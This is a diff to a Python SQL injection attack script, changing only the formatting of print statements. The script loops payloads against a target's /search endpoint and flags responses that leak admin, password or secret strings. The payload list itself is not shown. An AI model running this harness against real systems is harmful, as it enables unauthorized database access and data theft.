@@ -28,8 +28,7 @@ SQL_PAYLOADS = [
 def run(target: str, delay: float = 0.2, max_rounds: int = 3) -> int:
     target = target.rstrip("/")
     print(
-        f"[sqli] attacking {target}/search with {len(SQL_PAYLOADS)} "
-        f"payloads x{max_rounds} rounds"
+        f"[sqli] attacking {target}/search with {len(SQL_PAYLOADS)} payloads x{max_rounds} rounds"
     )
     for round_idx in range(max_rounds):
         for payload in SQL_PAYLOADS:
@@ -48,7 +47,7 @@ def run(target: str, delay: float = 0.2, max_rounds: int = 3) -> int:
                 body = ""
             leaked = "admin" in body or "password" in body or "SECRET" in body
             print(
-                f"  round {round_idx+1}  payload={payload[:35]:35s}  "
+                f"  round {round_idx + 1}  payload={payload[:35]:35s}  "
                 f"status={code}  leaked={leaked}"
             )
             time.sleep(delay)
